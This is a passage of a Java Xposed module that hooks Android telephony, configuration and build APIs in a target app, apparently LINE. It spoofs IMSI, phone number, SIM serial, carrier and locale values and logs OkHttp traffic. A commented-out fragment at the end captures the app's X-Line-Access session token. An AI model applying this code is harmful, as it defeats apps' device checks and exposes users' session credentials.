package com.example.xposedemo.Hook;

//HookTelephony all=   allHook

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import com.example.xposedemo.utils.MyFile;
import com.example.xposedemo.utils.SharedPref;
import com.example.xposedemo.utils.Ut;

import java.security.PublicKey;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import java.util.logging.Logger;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import okhttp3.FormBody;
import okhttp3.Interceptor;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.internal.authenticator.JavaNetAuthenticator;

/**
 * Created by Administrator on 2017/4/17 0017.
 */
public class Phone   {

    private String TAG="Phone";
    private ArrayList<String> methodNamelist;
    public String jsonStrPhone;
    public static Context[] contexts;
    public static Map<String,String> mapDevice;
    JSONObject jsonObjectParaPhone;
    private String jsonStrLanguage;
    private JSONObject jobjLanguage;
    public static int putNum = 0;

    public Phone( XC_LoadPackage.LoadPackageParam sharePkgParam )  {

        methodNamelist=new ArrayList<>();
        hookLanguage( sharePkgParam );
        Telephony( sharePkgParam );
        //new HookOkHttp( sharePkgParam );

        hookLineResponse(  sharePkgParam );
/*
        try {
            HttpClass.initHooking( sharePkgParam );
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        new HookOkHttp( sharePkgParam );*/

    /*    new HookOkHttp( sharePkgParam );*/

        //        try {
        //            HttpClass.initHooking( sharePkgParam );
        //        } catch (NoSuchMethodException e) {
        //            Log.d(TAG, "Phone: HttpClass exception:"+e.toString() );
        //            e.printStackTrace();
        //        }
        //hookTestValueB( sharePkgParam );
        //hookOkhttp3( sharePkgParam );
/*
        hookOkhttp( sharePkgParam );*/


  /*      //hookTestSystemGet( "android.os.SystemProperties", sharePkgParam );
        //hookTestValue( sharePkgParam,"k54.m",null,null );//18.2
        //ul3.n
        //hookTestValue( sharePkgParam,"bf3.l","b","c" ); //12.1.0
        // hookTestValue( sharePkgParam,"bb3.l","b","c" ); //12.0.1
        // hookTestValue( sharePkgParam,"e83.l","b","c" ); //11.20.1
        //hookTestValue( sharePkgParam,"ul3.n",null,null ); //12.1.0*/

 /*      methodAB ( sharePkgParam,"i34.m",null,null ); //12.16.0
        methodABNew ( sharePkgParam,"ut.a",null,null ); //12.16.0   //new ab
        hookHeader( sharePkgParam );*/

/*     hookOkResponse( sharePkgParam );*/
        //hookTestValue( sharePkgParam,"ts3.m",null,null ); //12.12
        //versionHo( sharePkgParam );


    }

    public void hookLanguage( XC_LoadPackage.LoadPackageParam sharePkgParam )  {

//        XposedHelpers.findField(Build.class,"BOARD").set(null,jsonObject.get( "board" ) );
//        XposedHelpers.findField(Build.class, "SERIAL").set(null,  jsonObject.get("serial") ); //串口序列号
//        XposedHelpers.findField(Build.class, "BRAND").set(null, jsonObject.get("brand")  ); // 手机品牌
//        XposedHelpers.findField(Build.class, "CPU_ABI").set(null, jsonObject.get("cpu_abi")  );
//        //XposedHelpers.findField(Build.class, "CPU_ABI2").set(null, jsonObject.get("cpu_abi2")  );
//        XposedHelpers.findField(Build.class, "DEVICE").set(null, jsonObject.get("device") );
        Log.d(TAG, "hookLanguagesTest: run");
        // 修改为指定的运营商mnc mcc信息

        jsonStrLanguage=MyFile.readFileToString( HookShare.PATH_DEVICE_LANGUAGE_DATA );
        if ( jsonStrLanguage !=null&& !jsonStrLanguage.equals("") ){
            jobjLanguage = JSONObject.parseObject( jsonStrLanguage );
        }

        jsonStrPhone =MyFile.readFileToString(HookShare.PATH_DEVICE_PHONE_DATA);
        Log.d(TAG, "Telephony: json="+ jsonStrPhone);
        if ( jsonStrPhone !=null&& !jsonStrPhone.equals("") ){
            jsonObjectParaPhone = JSONObject.parseObject(jsonStrPhone);
        }


        try {


            XposedHelpers.findAndHookMethod(android.content.res.Resources.class.getName(), sharePkgParam.classLoader , "getConfiguration", new XC_MethodHook() {

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);

                    Configuration configuration = (Configuration) param.getResult();
                    if (jobjLanguage!=null){
                        String lang=jobjLanguage.getString( "language" );
                        Log.d(TAG, "afterHookedMethod: language set="+ lang );
                        String arr[]=lang.split("_");
                        if (arr.length==1){
                            configuration.setLocale( new Locale( arr[0] ));
                        }else if (arr.length==2){
                            configuration.setLocale( new Locale( arr[0] ,arr[1]) );
                        }else if (arr.length==3){
                            configuration.setLocale( new Locale( arr[0] ,arr[1],arr[2]) );
                        }
                    }

                    if (jsonObjectParaPhone!=null){
                         configuration.mcc = Integer.parseInt(jsonObjectParaPhone.getString("mcc") );
                         configuration.mnc = Integer.parseInt(jsonObjectParaPhone.getString("mnc") );
                    }
                    //configuration.setLocale( new Locale( "bo","IN" ));
                   // configuration.setLocale( new Locale( "zh","HK","#Hans" ));
                    // configuration.mcc = Integer.parseInt(jsonObjectPara.getString("mcc"));
    //                configuration.mnc = Integer.parseInt(jsonObjectPara.getString("mnc"));

                    //configuration.densityDpi=560;
                    //                     configuration.fontScale=1;
                    //                    configuration.hardKeyboardHidden=2;
                    //                    configuration.keyboard=1;
    //                        configuration.orientation=1;
    //                        configuration.uiMode=17;
    //                        configuration.screenHeightDp=659;
                    //             configuration.screenLayout=268435794;
    //                      configuration.screenWidthDp=411;
    //                      configuration.smallestScreenWidthDp=411;
    //                        configuration.keyboardHidden=1;
    //                        configuration.navigation=1;
    //                        configuration.navigationHidden=2;
    //                        configuration.touchscreen=3;
                    //  Log.d(TAG, "HookTelephony="+methodNamelist.toString() );
                    //Log.d(TAG, "setHookValue: " + "getConfiguration" + "-result=" + param.getResult().toString());
                    param.setResult(configuration);
                    Log.d(TAG, "afterHookedMethod: hookLanguage mccmnc="+configuration.mcc+","+configuration.mnc );
                    Log.d(TAG, "afterHookedMethod: hookLanguage locale="+configuration.locale );
                    //Log.d(TAG, "afterHookedMethod: "+configuration.locale );
                }

            });
        } catch (Exception e) {
            Log.d(TAG, "hookLanguagesTest: excption="+e.toString() );
            e.printStackTrace();
        }


    }

    // 联网方式
    public void getType(XC_LoadPackage.LoadPackageParam loadPackageParam) {
        XposedHelpers.findAndHookMethod("android.net.NetworkInfo", loadPackageParam.classLoader, "getType",
                new XC_MethodHook() {
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        param.setResult(  SharedPref.getintXValue("getType") );
                    }
                });
    }

    public void query(){
        //获取内容解析者
        Log.d(TAG, "query: query");
    }


    public void  hookBuild(){

        // 修改手机系统信息 此处是手机的基本信息 包括厂商 信号 ROM版本 安卓版本 主板 设备名 指纹名称等信息
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "MODEL" ,"Nexus 6P" );
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "MANUFACTURER" ,"Huawei");
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "BRAND" , "google");
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "HARDWARE" ,"angler");
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "BOARD" ,"angler");
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "SERIAL" ,"ENU7N15A28004256" );
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "DEVICE" ,"angler");
        //XposedHelpers.setStaticObjectField(android.os.Build.class,  "ID" , );
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "PRODUCT" , "angler");
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "DISPLAY" ,"MTC20L" );
        XposedHelpers.setStaticObjectField(android.os.Build.class,  "FINGERPRINT","google/angler/angler:6.0.1/MTC20L/3230295:user/release-keys" );
        Log.d(TAG, "hookBuild: hookBuild");

    }

    //         loadPkgParam.classLoader, funcName, new XC_MethodHook()
    public void versionHo(final XC_LoadPackage.LoadPackageParam loadPkgParam){


        //package android.content.pm;
//        PackageInfo packageInfo = pm.getPackageInfo( "jp.naver.line.android", 0);
//        Log.d(TAG, "onCreate: version="+packageInfo.versionName  );


        final String strFinalVer;
        try {
            String strLver =MyFile.readFileToString(HookShare.PATH_LVER );

            Log.d(TAG, "versionHo: json="+ strLver);
            if ( strLver ==null|| strLver.equals("") ){
                Log.d(TAG, "Telephony: 参数为空");
                return;
            }

            JSONObject jsonObjectVer= JSON.parseObject( strLver ) ;
            strFinalVer = jsonObjectVer.getString( "lVer" );

            if (strFinalVer==null||strFinalVer.equals("") ){
                Log.d(TAG, "versionHo: Lver is empty,return");
                return;
            }
        } catch (Exception e) {
            Log.d(TAG, "versionHo: exception="+e );
            e.printStackTrace();
            return;
        }

        XposedHelpers.findAndHookMethod("android.app.ApplicationPackageManager", loadPkgParam.classLoader,"getPackageInfo"
        ,String.class,int.class,new XC_MethodHook(){

                    @Override
                    protected void afterHookedMethod( MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        PackageInfo packageInfo=   ( PackageInfo ) param.getResult();
                        //packageInfo.versionName="12.12.0";
                        //Log.d(TAG, "versionHo: all"+packageInfo );
                        Log.d(TAG, "versionHo: real="+packageInfo.packageName+"-"
                        +packageInfo.versionName );

                        if ( packageInfo.packageName.equals
                                (loadPkgParam.packageName  ) ){
                            Log.d(TAG, "versionHo: set="+strFinalVer );
                            packageInfo.versionName=strFinalVer;
                        }

                        param.setResult( packageInfo );

                    }

                } );

    }

   public void hookOkHttp4( XC_LoadPackage.LoadPackageParam loadPkgParam )   {
       Log.d(TAG, "hookOkHttp4: run");

      // XposedHelpers.findClass ("i34.m", loadPkgParam.classLoader )
//       XposedHelpers.findAndHookMethod("okhttp3.Request$Builder", loadPkgParam, "build", new XC_MethodHook() {
//           @Override
//           protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//               super.beforeHookedMethod(param);
//           }
//           @Override
//           protected void afterHookedMethod(MethodHookParam param) throws Throwable {
//               super.afterHookedMethod(param);
//           }
//       });

       try {
           XposedBridge.hookAllMethods( XposedHelpers.findClass( "okhttp3.Request$Builder" , loadPkgParam.classLoader), "build", new XC_MethodHook() {
               @Override
               protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                   super.beforeHookedMethod(param);
                 //  Log.d(TAG, "beforeHookedMethod: hookOkHttp4-"+param.getResult() );
               }

               @Override
               protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                   super.afterHookedMethod(param);
                   Log.d(TAG, "afterHookedMethod: hookOkHttp4-"+param.getResult() );
                   Log.d(TAG, "afterHookedMethod: hookOkhttp-"+param.getResult() );

               }
           });
       } catch (Exception e) {
           e.printStackTrace();
       }

   }

    public void hookOkHttpBody( XC_LoadPackage.LoadPackageParam loadPkgParam )   {
        Log.d(TAG, "hookOkHttpBody: run");

        // XposedHelpers.findClass ("i34.m", loadPkgParam.classLoader )

//       XposedHelpers.findAndHookMethod("okhttp3.Request$Builder", loadPkgParam, "build", new XC_MethodHook() {
//           @Override
//           protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//               super.beforeHookedMethod(param);
//           }
//           @Override
//           protected void afterHookedMethod(MethodHookParam param) throws Throwable {
//               super.afterHookedMethod(param);
//           }
//       });，
        try {
            XposedBridge.hookAllMethods( XposedHelpers.findClass( "okhttp3.Request" , loadPkgParam.classLoader), "body", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    super.beforeHookedMethod(param);

                    Log.d(TAG, "beforeHookedMethod: hookOkHttpBody-"+param.getResult() );
                }

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    RequestBody requestBody= (RequestBody) param.getResult();
                    Log.d(TAG, "afterHookedMethod: hookOkHttpBody-"+requestBody );
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public boolean hookTestSystemGet(String className, XC_LoadPackage.LoadPackageParam loadPkgParam){

        final String methodNameb="get";
        XposedHelpers.findAndHookMethod("android.os.SystemProperties",
                loadPkgParam.classLoader, "get", String.class,String.class, new XC_MethodHook() {


            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {

                super.afterHookedMethod(param);
                String para = (String) param.args[0];
                Log.d(TAG, "afterHookedMethod: hookTestSystemGet="+(String) param.args[0]
            +","+param.getResult() );

//                if("gsm.operator.numeric".equals(para)||"no message".equals(para)) {
//
//                    Log.d(TAG, "hooktest-realvalue: method name="+methodNameb  );
//                    for (int i=0;i<param.args.length;i++ ){
//                        Log.d(TAG, "hooktest-realvalue: para= "+param.args[i]  );
//                    }
//                    Log.d(TAG, "hooktest-realvalue result="+param.getResult() );
//                    Log.d(TAG, "hooktest-realvalue --------------------" );
//
//                }
            }


        });


        XposedHelpers.findAndHookMethod("android.os.Build",
                loadPkgParam.classLoader, "getString", String.class, new XC_MethodHook() {


                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {

                        super.afterHookedMethod(param);
                        String para = (String) param.args[0];
                        Log.d(TAG, "afterHookedMethod: hookTestSystemGet="+(String) param.args[0]
                                +","+param.getResult() );

//                if("gsm.operator.numeric".equals(para)||"no message".equals(para)) {
//
//                    Log.d(TAG, "hooktest-realvalue: method name="+methodNameb  );
//                    for (int i=0;i<param.args.length;i++ ){
//                        Log.d(TAG, "hooktest-realvalue: para= "+param.args[i]  );
//                    }
//                    Log.d(TAG, "hooktest-realvalue result="+param.getResult() );
//                    Log.d(TAG, "hooktest-realvalue --------------------" );
//
//                }
                    }


                });


        //className="android.telephony.SubscriptionManager";
    /*    final String methodName="getTelephonyProperty";


        try {
            XposedHelpers.findAndHookMethod(className
                    , loadPkgParam.classLoader
                    ,methodName
                    ,int.class
                    ,String.class
                    ,String.class
                    ,new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                            super.beforeHookedMethod(param);
                        }

                        @Override
                        protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                            super.afterHookedMethod(param);

                            Log.d(TAG, "hooktest-realvalue: method name="+methodName  );
                            for (int i=0;i<param.args.length;i++ ){
                                Log.d(TAG, "hooktest-realvalue: para= "+param.args[i]  );
                            }

                            Log.d(TAG, "hooktest-realvalue result="+param.getResult() );
                            Log.d(TAG, "hooktest-realvalue --------------------" );

                        }
                    });
        } catch (Exception e) {
            Log.d(TAG, "hookTest: catch-"+e.toString() );
            e.printStackTrace();
        }
*/

        return true;

    }


    public void Telephony(XC_LoadPackage.LoadPackageParam loadPkgParam) {

     /*   contexts = new Context[1];
        XposedHelpers.findAndHookMethod(Application.class, "attach", Context.class, new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                Log.d(TAG, "afterHookedMethod: getContext-run");
                super.afterHookedMethod( param );
                contexts[0] = (Context) param.args[0];
                mapDevice=new HashMap<>();
                MultiprocessSharedPreferences.setAuthority("com.example.xposedemo.provider");
                SharedPreferences sharedPreferences = MultiprocessSharedPreferences.getSharedPreferences( contexts[0] , "test", Context.MODE_PRIVATE );
                String hello = sharedPreferences.getString("tel", "");
                mapDevice.put( "tel", hello );

            }
        });*/

        Log.d(TAG, "Telephony: " );
        String TelePhone = "android.telephony.TelephonyManager";


//       if (hookTest(TelePhone,loadPkgParam)){
//           return;
//        }

        //TelePhone="android.telecom.TelephonyManager";

      /*  try {
            if(Build.VERSION.SDK_INT < 22){
                XposedHelpers.findAndHookMethod("com.android.internal.telephony.gsm.GSMPhone", loadPkgParam.classLoader, "getDeviceId", XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
                XposedHelpers.findAndHookMethod("com.android.internal.telephony.PhoneProxy", loadPkgParam.classLoader, "getDeviceId", XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
            }
            else if(Build.VERSION.SDK_INT == 22){
                XposedHelpers.findAndHookMethod("android.telephony.TelephonyManager", loadPkgParam.classLoader, "getDeviceId", XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
                XposedHelpers.findAndHookMethod("com.android.internal.telephony.PhoneSubInfo", loadPkgParam.classLoader, "getDeviceId", XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
            }
            else if(Build.VERSION.SDK_INT == 23){
                XposedHelpers.findAndHookMethod("android.telephony.TelephonyManager", loadPkgParam.classLoader, "getDeviceId", XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
                XposedHelpers.findAndHookMethod("com.android.internal.telephony.PhoneSubInfo", loadPkgParam.classLoader, "getDeviceId", String.class, XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
            }
            else if(Build.VERSION.SDK_INT >= 24){
                XposedHelpers.findAndHookMethod("android.telephony.TelephonyManager", loadPkgParam.classLoader, "getDeviceId", XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
                XposedHelpers.findAndHookMethod("com.android.internal.telephony.PhoneSubInfoController", loadPkgParam.classLoader, "getDeviceIdForPhone", int.class, String.class, XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
                XposedHelpers.findAndHookMethod("com.android.internal.telephony.PhoneSubInfoController", loadPkgParam.classLoader, "getImeiForSubscriber", int.class, String.class, XC_MethodReplacement.returnConstant(SharedPref.getXValue("IMEI")));
            }
        } catch (Exception ex) {
            XposedBridge.log(" IMEI 错误: " + ex.getMessage());
        }
*/
       // jsonStr=SharedPref.getXValue("json");
//        if (ContextGet.context==null)
//            return;

//        String tmp= Utils.readFileToString( HookShare.PATH_DEVICE_PHONE_DATA );
//        Log.d(TAG, "Telephony: jsondate="+tmp );

//        try {
//            jsonStr=Utils.readFileToString(  HookShare.PATH_DEVICE_PHONE_DATA );
//        } catch (Exception e) {
//
//            Log.d(TAG, "exception Telephony: readFileToString"+e.toString() );
//            e.printStackTrace();

        //android.content.pm;


//        PackageManager pm = getApplicationContext().getPackageManager();
//        Log.d(TAG, "onCreate: pkg name="+getApplicationContext().getPackageName() );
//        try {
//            PackageInfo packageInfo = pm.getPackageInfo( "jp.naver.line.android", 0);
//            Log.d(TAG, "onCreate: version="+packageInfo.versionName  );
//        } catch (PackageManager.NameNotFoundException e) {
//            e.printStackTrace();
//        }
     //   XposedHelpers.findAndHookMethod( "android.content.pm.PackageManager", )


        jsonStrPhone =MyFile.readFileToString(HookShare.PATH_DEVICE_PHONE_DATA);

        Log.d(TAG, "Telephony: json="+ jsonStrPhone);
        if ( jsonStrPhone ==null|| jsonStrPhone.equals("") ){
            Log.d(TAG, "Telephony: 参数为空");
            return;
        }

        jsonObjectParaPhone = JSONObject.parseObject(jsonStrPhone);
        //hookBuild();
        Log.d(TAG, "Telephony: json="+ jsonStrPhone);


        // 修改手机系统信息 此处是手机的基本信息 包括厂商 信号 ROM版本 安卓版本 主板 设备名 指纹名称等信息
     /*   XposedHelpers.findAndHookMethod(TelePhone,
                loadPkgParam.classLoader , "getDeviceId",int.class,
                new XC_MethodHook() {

                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                        //super.beforeHookedMethod(param);
                        param.args[0]=0;
                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        String v=jsonObjectPara.getString( "getDeviceId" );
                        Log.d(TAG, "setHook: getDeviceId-"+v );
                        param.setResult( v ) ;
                    }

                });*/

        // imei 修改手机系统信息 此处是手机的基本信息 包括厂商 信号 ROM版本 安卓版本 主板 设备名 指纹名称等信息
/*        XposedHelpers.findAndHookMethod(TelePhone,
                loadPkgParam.classLoader , "getDeviceId",
                new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        String v=jsonObjectPara.getString( "getDeviceId" );
                        Log.d(TAG, "setHook: getDeviceId-"+v );
                        param.setResult( v ) ;
                    }
                });*/

     /*           XposedHelpers.findAndHookMethod(TelePhone,
                loadPkgParam.classLoader, "getImei",new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        String v=jsonObjectPara.getString( "getDeviceId" );
                        Log.d(TAG, "setHook: getImei-"+v );
                        param.setResult( v);
                    }
                });*/

         /*       XposedHelpers.findAndHookMethod(TelePhone,
                loadPkgParam.classLoader, "getImei",int.class,new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        String v=jsonObjectPara.getString( "getDeviceId" );
                        Log.d(TAG, "setHook: getImei-"+v );
                        param.setResult( v);
                    }
                });*/

      /*          // 修改为指定的运营商mnc mcc信息
                XposedHelpers.findAndHookMethod(android.content.res.Resources.class.getName(), loadPkgParam.classLoader, "getConfiguration", new XC_MethodHook() {

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);

                        Configuration configuration = (Configuration) param.getResult();
                        configuration.mcc = Integer.parseInt(jsonObjectParaPhone.getString("mcc"));
                        configuration.mnc = Integer.parseInt(jsonObjectParaPhone.getString("mnc"));
                       configuration.setLocale( new Locale( "bo","IN" ));

                        //configuration.densityDpi=560;
                        //                     configuration.fontScale=1;
                        //                    configuration.hardKeyboardHidden=2;
                        //                    configuration.keyboard=1;
//                        configuration.orientation=1;
//                        configuration.uiMode=17;
//                        configuration.screenHeightDp=659;
                        //             configuration.screenLayout=268435794;
//                      configuration.screenWidthDp=411;
//                      configuration.smallestScreenWidthDp=411;
//                        configuration.keyboardHidden=1;
//                        configuration.navigation=1;
//                        configuration.navigationHidden=2;
//                        configuration.touchscreen=3;
                        //  Log.d(TAG, "HookTelephony="+methodNamelist.toString() );
                        //Log.d(TAG, "setHookValue: " + "getConfiguration" + "-result=" + param.getResult().toString());
                        param.setResult(configuration);
                    }

                });


*/
        HookTelephony(android.telephony.TelephonyManager.class.getName(),loadPkgParam,  "getPhoneType" , TelephonyManager.PHONE_TYPE_GSM );
        HookTelephony(android.telephony.TelephonyManager.class.getName(),loadPkgParam,  "getNetworkType" , TelephonyManager.NETWORK_TYPE_HSPAP);
        HookTelephony(android.telephony.TelephonyManager.class.getName(),loadPkgParam,  "getSimState" , TelephonyManager.SIM_STATE_READY);

        //HookTelephony(android.telephony.TelephonyManager.class.getName(),loadPkgParam,  "getSimStateIncludingLoaded" , TelephonyManager.SIM_STATE_READY);
        //com.android.internal.telephony.ISub

        //HookTelephony(android.telephony.TelephonyManager.class.getName(),loadPkgParam,  "hasIccCard" ,  true );

        //simstate
        XposedHelpers.findAndHookMethod("android.telephony.SubscriptionManager"
                , loadPkgParam.classLoader,
                "getSimStateForSlotIndex", int.class, new XC_MethodHook() {

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
                int ret = (int) param.args[0];
                param.setResult(10);
                Log.d(TAG, "afterHookedMethod: " +
                        "getSimStateForSlotIndex para="+ret );
                Log.d(TAG,
                        "afterHookedMethod: getSimStateForSlotIndex result="+param.getResult() );

            }
        });


        //carrierNameId
      /*  XposedHelpers.findAndHookMethod(
                "com.android.phone.PhoneInterfaceManager"
                , loadPkgParam.classLoader,
                "getSubscriptionCarrierName",int.class,
                new XC_MethodHook() {

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        //int ret = (int) param.args[0];
                        Log.d(TAG,
                                "afterHookedMethod: getSubscriptionCarrierName result="+param.getResult() );

                    }
                });*/

        //package

   /*     String fucName="getDeviceSoftwareVersion";
        HookTelephony(TelePhone, loadPkgParam, fucName,
                jsonObjectPara.getString( fucName )  );  //返系统版本*/

        String fucName;
        fucName="getSubscriberId";          //460017932859596 imsi
        HookTelephony(TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );

        fucName="getLine1Number";          //13117511178 返系统版本
        HookTelephony(TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );

        fucName="getSimSerialNumber";          //89860179328595969501 序列号
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );

        fucName="getNetworkOperator";          //45413 运营商网络类型
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );

        fucName="getNetworkOperatorName";       //45413 网络类型名
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );

        fucName="getSimOperator";       //45413 运营商
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );

        fucName="getSimOperatorName";       //中国联通 运营商名字
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );


        fucName="getNetworkCountryIso";       //中国联通 国家iso代码
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );


        fucName="getSimCountryIso";       //hk 手机卡国家
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString( fucName )  );

  /*      fucName="getDeviceSoftwareVersion";
        HookTelephony( TelePhone, loadPkgParam, fucName,
                "100"  );*/

//        fucName="getSimSpecificCarrierId";
//        HookTelephony( TelePhone, loadPkgParam, fucName,
//                ""  );


        fucName="getSimCarrierIdName";
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectParaPhone.getString("getSimOperatorName") );

/*        fucName="getCallState";
        HookTelephony( TelePhone, loadPkgParam, fucName,
                0 );

        fucName="getNetworkSpecifier";
        HookTelephony( TelePhone, loadPkgParam, fucName,
                2 );

        fucName="getDataState";
        HookTelephony( TelePhone, loadPkgParam, fucName,
                0 );*/

        //Log.d(TAG, "testPhone: q-getSimSpecificCarrierId="+getSimSpecificCarrierId );
        //Log.d(TAG, "testPhone: q-getNetworkSpecifier="+getNetworkSpecifier );
        //Log.d(TAG, "testPhone: q-getCarrierIdFromSimMccMnc="+getCarrierIdFromSimMccMnc );
        //Log.d(TAG, "testPhone: q-getCardIdForDefaultEuicc="+ getCardIdForDefaultEuicc );

 /*       fucName="GetNeighboringCellInfo";       //
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectPara.getString( fucName )  ); // 获取邻近的基站信息，返回的是List<NeighboringCellInfo>基站列表信息
        fucName="getCellLocation";       //
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectPara.getString( fucName )  ); // 获取当前基站信息
        fucName="getAllCellInfo";       //
        HookTelephony( TelePhone, loadPkgParam, fucName,
                jsonObjectPara.getString( fucName )  ); // List<CellInfo>基站列表信息*/

        
    /*    XposedBridge.hookAllMethods(findClass("pc.a.b.n", loadPkgParam.classLoader), "b", new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                Log.v(TAG, "LineWrite: (" + param.args[0] + ")" + param.args[1]);
            }
        });

        XposedBridge.hookAllMethods(findClass("pc.a.b.n", loadPkgParam.classLoader), "a", new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                Log.w(TAG, "LineRead1: (" + param.args[1] + ")" + param.args[0]);
            }
        });
        */

    }

    public void hookOkhttp3(XC_LoadPackage.LoadPackageParam loadPkgParam)   {


        try {
            XposedBridge.hookAllConstructors(Class.forName("okhttp3.Request"), new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    for ( Object obj :
                        param.args ) {
                        Log.d(TAG, "afterHookedMethod: hookOkhttp3="+obj );
                    }
                    Log.d(TAG, "afterHookedMethod: hookOkhttp3===========================");
                }
            });
        } catch (ClassNotFoundException e) {
            Log.d(TAG, "hookOkhttp3: "+e.toString());
            e.printStackTrace();
        }
    }

    private void hookTestLineMethod(XC_LoadPackage.LoadPackageParam loadPkgParam
            , String  className , final String methodName  ) {

        Log.d(TAG, "hookOkhttp: run" );
        try {

            XposedBridge.hookAllMethods( XposedHelpers.findClass (className, loadPkgParam.classLoader ),
                    methodName, new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {

                            String str="hookOkhttp write: (" + param.args[0] + ")" + param.args[1];
                            StringBuilder sb=new StringBuilder();
                            sb.append("hookOkhttp : "+ methodName+":");
                            for (int i=0;i<param.args.length;i++ ){
                                sb.append( "["+param.args[i]+"]" );
                            }
                            str=sb.toString();
                            Log.d(TAG,str );
                            //Ut.fileAppend( HookShare.pathDataLog,str+"\n" );
                        }
                    });
        } catch (Exception e) {
            Log.d(TAG, "hookOkhttp: Exception "+e.toString() );
            e.printStackTrace();
        }


    }

    /*
    public void hookLine(  XC_LoadPackage.LoadPackageParam  loadPackageParam ){
        //Response response;
        try {
            XposedBridge.hookAllMethods( XposedHelpers.findClass("okhttp3.Request$Builder",loadPackageParam.classLoader ), "headers"
                    , new XC_MethodHook() {
                        @Override
                        protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                            super.afterHookedMethod(param);
                            Map<String, List<String>> headers = (Map<String, List<String> >) XposedHelpers.callMethod(
                                    param.args[0], "toMultimap");

                            if ((headers.get("X-Line-Access") != null) && (headers.get("X-Line-Access").get(0).startsWith("eyJ")) && (putNum % 5 == 0)) {

                                JSONObject jobj = new JSONObject( headers );
                                //Logger.w("xxx_addheader:" + jobj);

                                MediaType jsonMediaType = MediaType.parse("application/json; charset=utf-8");
                                RequestBody body = RequestBody.create(jobj.toString(), jsonMediaType);
